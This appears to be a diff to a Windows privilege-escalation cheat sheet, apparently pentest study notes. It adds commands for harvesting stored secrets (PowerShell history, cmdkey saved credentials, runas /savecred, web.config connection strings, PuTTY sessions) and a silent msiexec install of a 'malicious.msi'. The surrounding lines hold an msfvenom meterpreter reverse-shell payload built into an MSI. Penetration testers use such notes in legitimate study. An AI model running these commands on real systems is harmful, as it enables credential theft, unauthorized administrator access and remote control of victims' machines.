@@ -72,6 +72,19 @@ findstr /spin "password" *.*
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+cmdkey /list
+
+#use saved credentials
+runas /savecred /user:admin cmd.exe
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
 ```
 
 
@@ -173,6 +186,13 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 According the access whatever the path will show by autorun64.exe
 ```
 
+
+##### Scheduled tasks :
+```bash
+schtasks /query /tn vulntask /fo list /v
+```
+
+
 ##### Registry Escalation - AlwaysinstallElevated:
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
@@ -183,6 +203,8 @@ used 'Write-UserAddMSI' command this will runas administrator add persistance us
 msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
 setup listner 
 execute setup.msi file
+
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
 ```
 ##### Service Escalation - Registry:
